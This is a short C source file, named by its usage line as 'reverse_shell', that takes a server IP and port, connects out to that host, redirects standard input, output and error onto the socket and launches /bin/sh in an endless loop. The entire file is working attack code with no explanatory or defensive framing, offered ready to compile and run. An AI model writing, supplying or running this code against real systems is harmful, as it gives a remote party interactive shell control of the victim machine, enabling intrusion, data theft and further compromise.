#include <stdio.h>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

void	RunShell(char *serverIP, int port) {
    while (1) {
        int sock;
        struct sockaddr_in sa;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(serverIP);
        sa.sin_port = htons(port);

        sock = socket(AF_INET, SOCK_STREAM, 0);
        connect(sock, (struct sockaddr *)&sa, sizeof(sa));
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        execve("/bin/sh", 0, 0);
    }
}

int	main(int ac, char **av) {
    if (ac == 3)
        RunShell(av[1], atoi(av[2]));
    else
        printf("Usage:\n\t./reverse_shell ServerIP Port");
}